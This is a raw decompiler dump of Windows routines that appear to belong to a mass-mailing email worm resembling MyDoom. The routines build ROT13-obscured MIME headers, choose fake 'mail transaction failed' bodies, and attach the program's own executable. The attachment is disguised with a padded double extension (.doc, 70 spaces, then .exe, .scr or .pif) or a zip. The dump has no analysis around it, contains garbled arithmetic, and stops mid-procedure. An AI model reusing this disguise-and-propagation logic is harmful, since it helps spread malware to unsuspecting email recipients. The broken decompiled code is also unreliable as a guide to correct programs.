	/* unknown */ void  Vfffffffc;



    004a748d: (save)6;
    004a7491: ebx = 1;
    004a7492: (save)1;
    004a7493: (save)2;
    004a749b: esi = *L004a1148();
    004a749f: if(esi != 0 && esi != -1) {
        004a74ae: eax = Ac;
        004a74b1: ecx = 1000;
        004a74b6: asm("cdq");
        004a74b7: edx = ecx / ecx % ecx / ecx;
        004a74b9: Vfffffff8 = 0;
        004a74bd: Vfffffffc = ebx;
        004a74c0: Vfffffff4 = eax;
        004a74c6: (save) & Vfffffffc;
        004a74c7: (save)-2147195266;
        004a74cc: (save)esi;
        004a74cd: *L004a1160();
        004a74d3: edi = *L004A1150;
        004a74d9: (save)16;
        004a74db: (save)A8;
        004a74de: for((save)esi; 1; (save)esi) {
            004a74df: eax = *edi();
            004a74e4: Vfffffffc = eax;
            004a74e7: if(eax != -1) {
                ff100499: goto L004a7578;
            }
            004a74ed: eax = *L004a1140();
            004a74f8: Vfffffffc = eax;
            004a74fb: if(eax != 10055) {
                ff10049b: break;
            }
            004a74fd: (save)50;
            004a74ff: *__imp__Sleep();
            004a7505: (save)16;
            004a7507: (save)A8;
        }
        004a7512: if(eax == 10035) {
            004a7517: Vfffffdf0 = esi;
            004a751d: (save) & Vfffffff4;
            004a7524: (save) & Vfffffef0;
            004a752b: (save) & Vfffffdec;
            004a752f: (save)0;
            004a7531: (save)esi + 1;
            004a7532: Vfffffdec = ebx;
            004a7538: Vfffffef4 = esi;
            004a753e: Vfffffef0 = ebx;
            004a7544: eax = *L004a1144();
            004a754c: Vfffffffc = eax;
            004a754f: if(eax == 0 || eax == -1) {
                ff10049f: goto L004a7590;
            }
            004a755c: (save) & Vfffffef0;
            004a755d: (save)esi;
            004a7565: if(L004A8AB2() != 0) {
                ff1004a3: goto L004a7590;
            }
            004a756d: (save) & Vfffffdec;
            004a756e: (save)esi;
            004a7576: if(L004A8AB2() == 0) {
                ff1004a5: goto L004a7590;
            }
004a7578: L004a7578:
            004a7578: Vfffffffc = 0;
            004a757f: (save) & Vfffffffc;
            004a7580: (save)-2147195266;
            004a7585: (save)esi;
            004a7586: *L004a1160();
            004a758c: eax = esi;
            004a758e: goto L004a7599;
        }
004a7590: L004a7590:
        004a7591: *L004a115c(esi);
    }
    004a7597: eax = 0;
004a7599: L004a7599:
}

/*	Procedure: 0x004A759E - 0x004A76A9
 *	Argument size: 4
 *	Local size: 1096
 *	Save regs size: 8
 */

L004A759E(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffbb8;
	/* unknown */ void  Vfffffd6e;
	/* unknown */ void  Vfffffe6f;
	/* unknown */ void  Vffffff74;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a75ac: ebx = 0;
    004a75b0: if(A8 != 0) {
        004a75b6: (save)A8;
        004a75c0: if(*__imp__lstrlenA() >= 7) {
            004a75c6: (save)1096;
            004a75d1: (save)ebx;
            004a75d2: (save) & Vfffffbb8;
            004a75d3: memset();
            004a75de: Vfffffbb8 = A8;
            004a75e4: (save) & Vfffffbb8;
            004a75e5: L004A76AA();
            004a75f0: (save) & Vfffffbb8;
            004a75f1: L004A776C();
            004a75fc: (save) & Vfffffbb8;
            004a75fd: L004A78C6();
            004a7608: (save) & Vfffffbb8;
            004a760e: esp = esp + 28;
            004a7613: if(L004A79D3() == 0) {
                004a761b: (save)3;
                004a761d: eax = Vffffff74 << 2;
                004a7620: asm("cdq");
                004a7621: (restore)ecx;
                004a7622: edx = ecx / ecx % ecx / ecx;
                004a7624: ecx = 1024;
                004a7629: eax = eax + 9119;
                004a762e: asm("cdq");
                004a762f: edx = ecx / ecx % ecx / ecx;
                004a7631: eax = eax << 10;
                004a7634: (save)eax;
                004a7635: (save)64;
                004a7637: Vfffffffc = eax;
                004a763a: eax = *__imp__GlobalAlloc();
                004a7642: Vfffffff8 = eax;
                004a7645: if(eax != ebx) {
                    004a7647: *eax = bl;
                    004a764f: (save) & Vfffffbb8;
                    004a7650: L004A7C55();
                    004a7664: (restore)ecx;
                    004a7665: if(L004A7D75( & Vfffffbb8) == 0) {
                        ff1004af: goto L004a768e;
                    }
                }
                004a766d: if(Vfffffd6e != bl) {
                    004a7675: (save) & Vfffffe6f;
                    004a7676: *__imp__DeleteFileA();
                }
                004a767f: if(Vfffffff8 != ebx) {
                    004a7681: (save)Vfffffff8;
                    004a7684: *__imp__GlobalFree();
                }
            }
        }
    }
    004a768a: eax = 0;
    004a768c: goto L004a76a6;
004a768e: L004a768e:
    004a7694: if(Vfffffd6e != bl) {
        004a769d: *__imp__DeleteFileA( & Vfffffe6f);
    }
    004a76a3: eax = Vfffffff8;
004a76a6: L004a76a6:
}

stack space not deallocated on return
/*	Procedure: 0x004A76AA - 0x004A776B
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L004A76AA(A4, A10)
/* unknown */ void  A4;
/* unknown */ void  A10;
{



    004a76aa: eax = A4;
    004a76ae: (save)ebx;
    004a76b0: *(eax + 4) = 0;
    004a76b4: ebx = eax + 4;
    004a76b7: L004A48BC(esi);
    004a76bc: eax = ax & 65535;
    004a76bf: (save)100;
    004a76c1: asm("cdq");
    004a76c8: if(ecx / ecx % ecx / ecx < 98) {
        004a76ca: esi = 0;
        004a76cc: eax = *L004A8D14;
        004a76d3: if(eax == 0) {
            ff1004b9: goto L004a7711;
        }
        004a76d5: do {
            004a76d5: eax = *eax;
            004a76d7: esi = esi + 1;
        } while(eax != 0);
        004a76df: if(esi <= 3) {
            ff1004bd: goto L004a7711;
        }
        004a76e1: L004A48D1();
        004a76e6: edx = 0;
        004a76e8: ecx = 0;
        004a76ea: edx = esi / esi % esi / esi;
        004a76ec: eax = *L004A8D14;
        004a76f3: if(eax == 0) {
            ff1004bf: goto L004a7711;
        }
        004a76f5: do {
            004a76f7: if(ecx == edx) {
                ff1004c1: break;
            }
            004a76f9: eax = *eax;
            004a76fb: ecx = ecx + 1;
        } while(eax != 0);
        004a7702: if(eax == 0) {
            ff1004c5: goto L004a7711;
        }
        004a7707: (save)eax + 10;
        004a7708: (save)ebx;
        004a7709: eax = *__imp__lstrcpyA();
    } else {
004a7711: L004a7711:
        004a7712: L004A48BC(edi);
        004a7717: eax = ax & 65535;
        004a771a: (save)3;
        004a771c: edi = 0;
        004a771e: asm("cdq");
        004a7720: ecx = ecx / ecx;
        004a7724: esi = ecx % ecx + ecx;
        004a7728: if(esi > 0) {
            004a772a: do {
                004a772a: L004A48BC();
                004a772f: eax = ax & 65535;
                004a7732: (save)26;
                004a7734: asm("cdq");
                004a7735: (restore)ecx;
                004a773b: *(ebx + edi) = ecx / ecx % ecx / ecx + 97;
                004a773e: edi = edi + 1;
            } while(edi < esi);
        }
        004a7747: esi = edi + A10;
        004a774a: *(esi + 4) = 64;
        004a7761: eax = L004A471C(esi + 5, *((L004A48BC() & 3) * 4 + 0x4a13cc));
        004a7768: (restore)edi;
    }
    004a7769: (restore)esi;
    004a776a: (restore)ebx;
}

/*	Procedure: 0x004A776C - 0x004A78C5
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 12
 */

L004A776C(A10)
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    004a776f: L004A48BC();
    004a7774: eax = ax & 65535;
    004a7777: (save)100;
    004a7779: asm("cdq");
    004a777a: (restore)ecx;
    004a7780: if(ecx / ecx % ecx / ecx < 8) {
        004a7782: L004A48BC();
        004a7787: eax = ax & 65535;
        004a778a: (save)5;
        004a778c: ebx = A10;
        004a7790: asm("cdq");
        004a7791: (restore)ecx;
        004a7792: edi = 0;
        004a7798: esi = ecx / ecx % ecx / ecx + 3;
        004a779d: if(esi > 0) {
            004a779f: do {
                004a779f: L004A48BC();
                004a77a4: eax = ax & 65535;
                004a77a7: (save)26;
                004a77a9: asm("cdq");
                004a77aa: (restore)ecx;
                004a77b0: *(ebx + edi + 388) = ecx / ecx % ecx / ecx + 97;
                004a77b7: edi = edi + 1;
            } while(edi < esi);
        }
        004a77bc: *(edi + ebx + 388) = 0;
    } else {
        004a77c6: al = *L004A3888;
        004a77cd: ebx = 1;
        004a77ce: esi = 0x4a3888;
        004a77d5: edi = 1;
        004a77d7: if(al != 0) {
            004a77d9: ecx = 0x4a3888;
            004a77db: do {
                004a77db: eax = al;
                004a77de: ecx = ecx + 8;
                004a77e1: edi = edi + eax;
                004a77e3: al = *ecx;
            } while(al != 0);
        }
        004a77e9: L004A48BC();
        004a77ee: eax = ax & 65535;
        004a77f1: asm("cdq");
        004a77f2: edx = edi / edi % edi / edi;
        004a77f4: al = *L004A3888;
        004a77f9: edi = 0;
        004a77fd: if(al != 0) {
            004a77ff: ecx = esi;
            004a7801: do {
                004a7804: ebx = ebx + al;
                004a7808: if(ebx >= edx) {
                    ff1004d7: break;
                }
                004a780a: al = *(ecx + 8);
                004a780d: ecx = ecx + 8;
                004a7810: edi = edi + 1;
            } while(al != 0);
        }
        004a781d: if(*(edi * 8 + 0x4a3888) == 0) {
            004a781f: edi = 0;
        }
        004a7821: ebx = A10;
        004a7833: L004A471C(ebx + 388, *(edi * 8 + 0x4a388c));
    }
    004a783a: al = *L004A38D8;
    004a783f: (save)1;
    004a7843: (restore)edi;
    004a7844: esi = 0x4a38d8;
    004a7849: if(al != 0) {
        004a784b: ecx = 0x4a38d8;
        004a784d: do {
            004a784d: eax = al;
            004a7850: ecx = ecx + 8;
            004a7853: edi = edi + eax;
            004a7855: al = *ecx;
        } while(al != 0);
    }
    004a785b: L004A48BC();
    004a7860: eax = ax & 65535;
    004a7863: asm("cdq");
    004a7864: edx = edi / edi % edi / edi;
    004a7866: al = *L004A38D8;
    004a786b: (save)1;
    004a786d: ecx = 0;
    004a786f: for((restore)edi; al != 0; esi = esi + 8) {
        004a7877: edi = edi + al;
        004a787b: if(edi >= edx) {
            ff1004e3: break;
        }
        004a787d: al = *(esi + 8);
        004a7880: ecx = ecx + 1;
    }
    004a788e: if(*(ecx * 8 + 0x4a38d8) == 0) {
        004a7890: ecx = 0;
    }
    004a7899: esi = ebx + 420;
    004a78a0: L004A471C(esi, *(ecx * 8 + 0x4a38dc));
    004a78ab: (save)esi;
    004a78ac: (save)ebx + 388;
    004a78b3: (save)"%s.%s";
    004a78b8: (save)ebx + 439;
    004a78bf: esp = esp + 24;
    004a78c5: return(*__imp__wsprintfA());
}

stack space not deallocated on return
/*	Procedure: 0x004A78C6 - 0x004A79D2
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 12
 */

L004A78C6(A20)
/* unknown */ void  A20;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    004a78c9: L004A48BC();
    004a78ce: eax = ax & 65535;
    004a78d1: (save)100;
    004a78d3: asm("cdq");
    004a78d4: (restore)ecx;
    004a78da: if(ecx / ecx % ecx / ecx < 5) {
        004a78dc: L004A48BC();
        004a78e1: eax = ax & 65535;
        004a78e4: (save)15;
        004a78e6: edi = A20;
        004a78ea: asm("cdq");
        004a78eb: (restore)ecx;
        004a78ec: ebx = 0;
        004a78f2: esi = ecx / ecx % ecx / ecx + 3;
        004a78f7: if(esi > 0) {
            004a78f9: do {
                004a78f9: L004A48BC();
                004a78fe: eax = ax & 65535;
                004a7901: (save)26;
                004a7903: asm("cdq");
                004a7904: (restore)ecx;
                004a790a: *(edi + ebx + 260) = ecx / ecx % ecx / ecx + 97;
                004a7911: ebx = ebx + 1;
            } while(ebx < esi);
        }
        004a7916: *(ebx + edi + 260) = 0;
    } else {
        004a7920: al = *L004A3908;
        004a7927: ebx = 1;
        004a7928: esi = 0x4a3908;
        004a792f: edi = 1;
        004a7931: if(al != 0) {
            004a7933: ecx = 0x4a3908;
            004a7935: do {
                004a7935: eax = al;
                004a7938: ecx = ecx + 8;
                004a793b: edi = edi + eax;
                004a793d: al = *ecx;
            } while(al != 0);
        }
        004a7943: L004A48BC();
        004a7948: eax = ax & 65535;
        004a794b: asm("cdq");
        004a794c: edx = edi / edi % edi / edi;
        004a794e: al = *L004A3908;
        004a7953: edi = 0;
        004a7957: if(al != 0) {
            004a7959: ecx = esi;
            004a795b: do {
                004a795e: ebx = ebx + al;
                004a7962: if(ebx >= edx) {
                    ff1004f3: break;
                }
                004a7964: al = *(ecx + 8);
                004a7967: ecx = ecx + 8;
                004a796a: edi = edi + 1;
            } while(al != 0);
        }
        004a7977: if(*(edi * 8 + 0x4a3908) == 0) {
            004a7979: edi = 0;
        }
        004a7982: edi = A20;
        004a798d: L004A471C(edi + 260, *(edi * 8 + 0x4a390c));
    }
    004a7994: L004A48BC();
    004a7999: eax = ax & 65535;
    004a799c: (save)100;
    004a799e: asm("cdq");
    004a799f: (restore)ecx;
    004a79a0: edx = ecx / ecx % ecx / ecx;
    004a79a5: if(edx >= 50) {
        004a79aa: if(edx >= 85) {
            ff1004fb: goto L004a79c2;
        }
        004a79b2: (save)1;
        004a79b4: (save)edi + 260;
        004a79b5: eax = *__imp__CharUpperBuffA();
    } else {
        004a79c0: if(edx >= 85) {
004a79c2: L004a79c2:
            004a79c9: eax = *__imp__CharUpperA(edi + 260);
        }
    }
}

/*	Procedure: 0x004A79D3 - 0x004A7C54
 *	Argument size: 4
 *	Local size: 776
 *	Save regs size: 8
 */

L004A79D3(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffcf8;
	/* unknown */ void  Vfffffdfc;
	/* unknown */ void  Vfffffffc;



    004a79de: esi = A8;
    004a79e1: ebx = 0;
    004a79e4: *(esi + 436) = 0;
    004a79ea: *(esi + 437) = 0;
    004a79f0: L004A48BC(edi);
    004a79f5: eax = ax & 65535;
    004a79f8: (save)100;
    004a79fa: asm("cdq");
    004a7a01: if(ecx / ecx % ecx / ecx < 64) {
        004a7a03: *(esi + 436) = 1;
    }
    004a7a10: if(*(esi + 436) == bl) {
        004a7a12: eax = esi + 695;
        004a7a18: (save)260;
        004a7a1d: (save)eax;
        004a7a1e: (save)ebx;
        004a7a1f: *(esi + 438) = bl;
        004a7a25: A8 = eax;
        004a7a28: *__imp__GetModuleFileNameA();
    } else {
        004a7a39: edi = 260;
        004a7a3e: (save) & Vfffffcf8;
        004a7a3f: (save)260;
        004a7a40: *(esi + 438) = 1;
        004a7a47: Vfffffcf8 = bl;
        004a7a4d: *__imp__GetTempPathA();
        004a7a59: if(Vfffffcf8 == bl) {
            ff100503: goto L004a7c4d;
        }
        004a7a5f: eax = esi + 695;
        004a7a65: A8 = eax;
        004a7a68: (save)eax;
        004a7a69: *eax = bl;
        004a7a6b: (save)ebx;
        004a7a72: (save)"tmp";
        004a7a77: (save) & Vfffffcf8;
        004a7a78: *__imp__GetTempFileNameA();
        004a7a83: if(*A8 == bl) {
            ff100505: goto L004a7c4d;
        }
        004a7a8f: (save)edi;
        004a7a90: (save) & Vfffffcf8;
        004a7a91: (save)ebx;
        004a7a92: *__imp__GetModuleFileNameA();
        004a7a98: *(esi + 437) = bl;
        004a7a9e: L004A48BC();
        004a7aa3: eax = ax & 65535;
        004a7aa6: (save)100;
        004a7aa8: asm("cdq");
        004a7aa9: (restore)ecx;
        004a7aaf: if(ecx / ecx % ecx / ecx < 40) {
            004a7ab1: *(esi + 437) = 1;
        }
        004a7abe: if(*(esi + 437) == bl) {
            004a7ac0: eax = esi + 439;
        } else {
            004a7ad1: (save)esi + 388;
            004a7ad8: (save) & Vfffffdfc;
            004a7ad9: *__imp__lstrcpyA();
            004a7adf: edi = __imp__lstrcatA;
            004a7aeb: (save)".";
            004a7af0: (save) & Vfffffdfc;
            004a7af1: *__imp__lstrcatA();
            004a7af3: L004A48BC();
            004a7af8: eax = ax & 65535;
            004a7afb: (save)5;
            004a7afd: asm("cdq");
            004a7afe: (restore)ecx;
            004a7aff: edx = ecx / ecx % ecx / ecx;
            004a7b03: if(edx != ebx) {
                004a7b05: <= ? L004a7b13 : ;
                004a7b0a: if(edx <= 2) {
                    004a7b0c: (save)"htm";
                } else {
                    004a7b13: (save)"txt";
                }
            } else {
                004a7b1a: (save)"doc";
            }
            004a7b25: (save) & Vfffffdfc;
            004a7b26: *edi();
            004a7b28: Vfffffffc = 70;
            004a7b2f: do {
                004a7b35: (save)" ";
                004a7b3a: (save) & Vfffffdfc;
                004a7b3b: *edi();
            } while(Vfffffffc = Vfffffffc - 1);
            004a7b48: (save)".";
            004a7b4d: (save) & Vfffffdfc;
            004a7b4e: *edi();
            004a7b50: L004A48BC();
            004a7b55: eax = ax & 65535;
            004a7b58: (save)3;
            004a7b5a: asm("cdq");
            004a7b5b: (restore)ecx;
            004a7b60: if(!(edx = ecx / ecx % ecx / ecx - ebx)) {
                004a7b63: if(!(edx = edx - 1)) {
                    004a7b6b: (save)"p";
                    004a7b70: (save) & Vfffffdfc;
                    004a7b71: *edi();
                    004a7b73: (save)"if";
                } else {
                    004a7b80: (save)"s";
                    004a7b85: (save) & Vfffffdfc;
                    004a7b86: *edi();
                    004a7b88: (save)"cr";
                }
            } else {
                004a7b95: (save)"e";
                004a7b9a: (save) & Vfffffdfc;
                004a7b9b: *edi();
                004a7b9d: (save)"xe";
            }
            004a7ba8: (save) & Vfffffdfc;
            004a7ba9: *edi();
            004a7bab: eax = & Vfffffdfc;
        }
        004a7bc6: if(L004A700E( & Vfffffcf8, A8, eax) != 0) {
            ff100515: goto L004a7c4d;
        }
        004a7bdf: *__imp__wsprintfA(esi + 439, "%s.zip", esi + 388);
    }
    004a7be8: (save)ebx;
    004a7be9: (save)128;
    004a7bee: (save)3;
    004a7bf0: (save)ebx;
    004a7bf1: (save)3;
    004a7bf3: (save)-2147483648;
    004a7bf8: (save)A8;
    004a7bfb: eax = *__imp__CreateFileA();
    004a7c03: Vfffffffc = eax;
    004a7c06: if(eax != ebx) {
        004a7c0b: if(eax == -1) {
            ff100519: goto L004a7c3c;
        }
        004a7c0d: (save)ebx;
        004a7c0e: (save)eax;
        004a7c0f: edi = esi + 956;
        004a7c1b: (save)Vfffffffc;
        004a7c1e: *edi = *__imp__GetFileSize();
        004a7c20: *__imp__CloseHandle();
        004a7c26: edi = *edi;
        004a7c2e: if(edi < 1024 || edi > 307200) {
            ff10051b: goto L004a7c3c;
        }
        004a7c38: eax = 0;
    } else {
004a7c3c: L004a7c3c:
        004a7c42: if(*(esi + 438) != bl) {
            004a7c47: *__imp__DeleteFileA(A8);
        }
004a7c4d: L004a7c4d:
        004a7c4f: eax = 1;
    }
    004a7c50: (restore)edi;
}

stack space not deallocated on return
/*	Procedure: 0x004A7C55 - 0x004A7D74
 *	Argument size: 24
 *	Local size: 0
 *	Save regs size: 4
 */

L004A7C55(Ac, A18, A20)
/* unknown */ void  Ac;
/* unknown */ void  A18;
/* unknown */ void  A20;
{
	/* unknown */ void  ebx;



    004a7c56: ebx = Ac;
    004a7c5a: (save)ebp;
    004a7c5b: (save)esi;
    004a7c5c: esi = *(ebx + 1088);
    004a7c62: (save)edi;
    004a7c63: edi = ebx + 960;
    004a7c69: A18 = edi;
    004a7c72: (save)L004A48D1();
    004a7c79: L004A48BC(L004A48D1());
    004a7c7e: eax = ax & 65535;
    004a7c81: (save)15;
    004a7c83: asm("cdq");
    004a7c87: (save)ecx / ecx % ecx / ecx;
    004a7c88: (save)0;
    004a7c8a: (save)"NextPart";
    004a7c8f: (save)"----=_%s_%.3u_%.4u_%.8X.%.8X";
    004a7c94: (save)edi;
    004a7c95: *__imp__wsprintfA();
    004a7ca1: L004A471C(esi, "Sebz: ");
    004a7ca6: ebp = __imp__lstrcatA;
    004a7cb2: (save)ebx + 4;
    004a7cb3: (save)esi;
    004a7cb4: *__imp__lstrcatA();
    004a7cb6: edi = __imp__lstrlenA;
    004a7cbc: (save)"\r\nGb: ";
    004a7cc1: (save)esi;
    004a7cc6: (save) *__imp__lstrlenA() + esi;
    004a7cc7: L004A471C();
    004a7ccc: (restore)ecx;
    004a7cce: (save) *ebx;
    004a7cd0: (save)esi;
    004a7cd1: *ebp();
    004a7cd3: (save)"\r\nFhowrpg: ";
    004a7cd8: (save)esi;
    004a7cde: L004A471C( *edi() + esi);
    004a7ce4: ebx = ebx + 260;
    004a7cea: (restore)ecx;
    004a7ceb: (save)ebx;
    004a7cec: (save)esi;
    004a7ced: *ebp();
    004a7cef: (save)"\r\nQngr: ";
    004a7cf4: (save)esi;
    004a7cf9: (save) *edi() + esi;
    004a7cfa: L004A471C();
    004a7cff: (restore)ecx;
    004a7d01: (save)esi;
    004a7d09: L004A4743(0, *edi() + esi);
    004a7d10: (save)"\r\nZVZR-Irefvba: 1.0";
    004a7d15: (save)esi;
    004a7d1a: (save) *edi() + esi;
    004a7d1b: L004A471C();
    004a7d20: (restore)ecx;
    004a7d22: (save)"\r\nPbagrag-Glcr: zhygvcneg/zvkrq;\r\n";
    004a7d27: (save)esi;
    004a7d2c: (save) *edi() + esi;
    004a7d2d: L004A471C();
    004a7d32: (save)A20;
    004a7d36: (save)"\tboundary=\"%s\"";
    004a7d3c: L004A4D64(esi);
    004a7d44: (save)"\r\nK-Cevbevgl: 3";
    004a7d49: (save)esi;
    004a7d4e: (save) *edi() + esi;
    004a7d4f: L004A471C();
    004a7d54: (restore)ecx;
    004a7d56: (save)"\r\nK-ZFZnvy-Cevbevgl: Abezny";
    004a7d5b: (save)esi;
    004a7d60: (save) *edi() + esi;
    004a7d61: L004A471C();
    004a7d66: (restore)ecx;
    004a7d6e: eax = *ebp(esi, "\r\n\r\n");
    004a7d70: (restore)edi;
    004a7d71: (restore)esi;
    004a7d72: (restore)ebp;
}

/*	Procedure: 0x004A7D75 - 0x004A7E3F
 *	Argument size: 4
 *	Local size: 512
 *	Save regs size: 4
 */

L004A7D75(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffe00;



    004a7d7f: ebx = A8;
    004a7d82: (save)esi;
    004a7d83: (save)edi;
    004a7d84: esi = *(ebx + 1088);
    004a7d8a: edi = __imp__lstrlenA;
    004a7d90: (save)"Guvf vf n zhygv-cneg zrffntr va ZVZR sbezng.\r\n\r\n";
    004a7d95: (save)esi;
    004a7d9a: (save) *__imp__lstrlenA() + esi;
    004a7d9b: L004A471C();
    004a7dac: L004A471C( & Vfffffe00, "--%f\r\nPbagrag-Glcr: grkg/cynva;\r\n\tpunefrg=\"Jvaqbjf-1252\"\r\nPbagrag-Genafsre-Rapbqvat: 7ovg\r\n\r\n");
    004a7db1: eax = ebx + 960;
    004a7db7: A8 = eax;
    004a7dba: (save)A8;
    004a7dc1: (save) & Vfffffe00;
    004a7dc3: L004A4D64(esi);
    004a7dcb: (save)esi;
    004a7dd2: L004A7E40(ebx, *edi() + esi);
    004a7dd9: (save)"\r\n\r\n\r\n";
    004a7dde: (save)esi;
    004a7ddf: *__imp__lstrcatA();
    004a7df1: L004A471C( & Vfffffe00, "--%f\r\nPbagrag-Glcr: nccyvpngvba/bpgrg-fgernz;\r\n\tanzr=\"%f\"\r\nPbagrag-Genafsre-Rapbqvat: onfr64\r\nPbagrag-Qvfcbfvgvba: nggnpuzrag;\r\n\tsvyranzr=\"%f\"\r\n\r\n");
    004a7df6: eax = ebx + 439;
    004a7dfc: (save)eax;
    004a7dfd: (save)eax;
    004a7dfe: (save)A8;
    004a7e07: (save) & Vfffffe00;
    004a7e09: L004A4D64(esi);
    004a7e11: (save)ebx;
    004a7e12: (save)esi;
    004a7e20: (restore)ecx;
    004a7e21: if(L004A7F5D( *edi() + esi) != 0) {
        004a7e25: eax = 1;
    } else {
        004a7e28: (save)A8;
        004a7e2b: (save)"\r\n\r\n--%s--\r\n\r\n";
        004a7e31: L004A4D64(esi);
        004a7e39: eax = 0;
    }
    004a7e3b: (restore)edi;
    004a7e3c: (restore)esi;
}

/*	Procedure: 0x004A7E40 - 0x004A7F5C
 *	Argument size: 4
 *	Local size: 48
 *	Save regs size: 8
 */

L004A7E40(Ac)
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a7e48: (save)20;
    004a7e4a: Vfffffff8 = 0;
    004a7e4e: (restore)esi;
    004a7e54: (save)40;
    004a7e56: Vffffffd0 = esi;
    004a7e59: (restore)ecx;
    004a7e5a: Vffffffd4 = 0x4a39c8;
    004a7e5d: Vffffffd8 = 5;
    004a7e64: Vffffffdc = "test";
    004a7e6b: Vffffffe0 = ecx;
    004a7e6e: Vffffffe4 = "The message cannot be represented in 7-bit ASCII encoding and has been sent as a binary attachment.";
    004a7e75: Vffffffe8 = ecx;
    004a7e78: Vffffffec = "The message contains Unicode characters and has been sent as a binary attachment.";
    004a7e7f: Vfffffff0 = esi;
    004a7e82: Vfffffff4 = "Mail transaction failed. Partial message is available.";
    004a7e89: Vfffffffc = 0x4a39c8;
    004a7e8c: L004A48BC();
    004a7e91: eax = ax & 65535;
    004a7e94: (save)100;
    004a7e96: asm("cdq");
    004a7e97: (restore)ecx;
    004a7e9c: if(ecx / ecx % ecx / ecx < esi) {
        004a7e9e: (save)ebx;
        004a7e9f: L004A48BC();
        004a7ea4: eax = ax & 65535;
        004a7ea7: asm("cdq");
        004a7ead: ebx = Ac;
        004a7eb2: esi = 0;
        004a7eb6: edi = 2048 / 2048 % 2048 / 2048 + 512;
        004a7ebe: if(edi > 0) {
            004a7ec0: do {
                004a7ec0: eax = L004A48BC();
                004a7ec7: if(al >= 32 && al != 61 && al != 43 && al != 255 && al != 127 && al != 128 && al != 64) {
                    004a7ee1: *(esi + ebx) = al;
                    004a7ee4: esi = esi + 1;
                    004a7ee5: L004A48BC();
                    004a7eea: eax = ax & 65535;
                    004a7eed: (save)70;
                    004a7eef: asm("cdq");
                    004a7ef0: (restore)ecx;
                    004a7ef5: if(ecx / ecx % ecx / ecx == 0) {
                        004a7ef7: *(esi + ebx) = 13;
                        004a7efb: esi = esi + 1;
                        004a7efc: *(esi + ebx) = 10;
                        004a7f00: esi = esi + 1;
                    }
                }
            } while(esi < edi);
        }
        004a7f05: *(esi + ebx) = 0;
        004a7f09: (restore)ebx;
    } else {
        004a7f0c: (save)1;
        004a7f0e: ecx = esi;
        004a7f10: (restore)edi;
        004a7f11: eax = & Vffffffd0;
        004a7f14: do {
            004a7f14: eax = eax + 8;
            004a7f17: edi = edi + ecx;
            004a7f19: ecx = *eax;
        } while(ecx != 0);
        004a7f1f: L004A48BC();
        004a7f24: eax = ax & 65535;
        004a7f27: asm("cdq");
        004a7f28: edx = edi / edi % edi / edi;
        004a7f2a: (save)1;
        004a7f2c: ecx = 0;
        004a7f2e: (restore)edi;
        004a7f2f: eax = & Vffffffd0;
        004a7f32: do {
            004a7f32: edi = edi + esi;
            004a7f36: if(edi >= edx) {
                ff10053b: break;
            }
            004a7f38: esi = *(eax + 8);
            004a7f3b: eax = eax + 8;
            004a7f3e: ecx = ecx + 1;
        } while(esi != 0);
        004a7f48: if(*(ebp + ecx * 8 - 48) == 0) {
            004a7f4a: ecx = 0;
        }
        004a7f53: eax = *__imp__lstrcpyA(Ac, *(ebp + ecx * 8 - 44));
    }
}

/*	Procedure: 0x004A7F5D - 0x004A807A
 *	Argument size: -1036
 *	Local size: 1044
 *	Save regs size: 0
 */

L004A7F5D(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffbec;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffa;
	/* unknown */ void  Vfffffffb;
	/* unknown */ void  Vfffffffc;



    004a7f69: (save)edi;
    004a7f6a: edi = 0;
    004a7f71: (save)0;
    004a7f72: (save)0;
    004a7f73: (save)3;
    004a7f75: (save)0;
    004a7f76: (save)3;
    004a7f78: (save)-2147483648;
    004a7f7d: (save)Ac + 695;
    004a7f7e: eax = *__imp__CreateFileA();
    004a7f87: Vffffffec = eax;
    004a7f8a: if(eax == -1) {
        004a7f8e: eax = 1;
    } else {
        004a7f94: (save)ebx;
        004a7f95: (save)esi;
        004a7f96: esi = 0;
        004a7f98: Vfffffffc = edi;
        004a7f9b: Vfffffff0 = edi;
        004a7f9e: ebx = 0;
        004a7fa0: for(Vfffffff4 = edi; 1; esi = 0) {
            004a7fa9: if(Vfffffffc >= Vfffffff0) {
                004a7fae: (save)edi;
                004a7faf: (save) & Vfffffff0;
                004a7fb6: (save)1024;
                004a7fbb: (save) & Vfffffbec;
                004a7fbc: (save)Vffffffec;
                004a7fbf: *__imp__ReadFile();
                004a7fc8: if(Vfffffff0 == edi) {
                    ff100545: break;
                }
                004a7fca: Vfffffffc = edi;
            }
            004a7fcd: eax = Vfffffffc;
            004a7fd0: esi = esi + 1;
            004a7fd1: Vfffffffc = Vfffffffc + 1;
            004a7fde: *(ebp + esi + 11) = *(ebp + eax + -1044);
            004a7fe2: if(esi != 3) {
                ff100547: continue;
            }
            004a7fe7: (save) & Vfffffff8;
            004a7fec: L004A807B( & Ac);
            004a7ff2: esi = 0;
            004a7ff4: (restore)ecx;
            004a7ff5: do {
                004a7ff5: eax = A8;
                004a7ffc: *(ebx + eax) = *(ebp + esi - 8);
                004a7fff: ebx = ebx + 1;
                004a8000: Vfffffff4 = Vfffffff4 + 1;
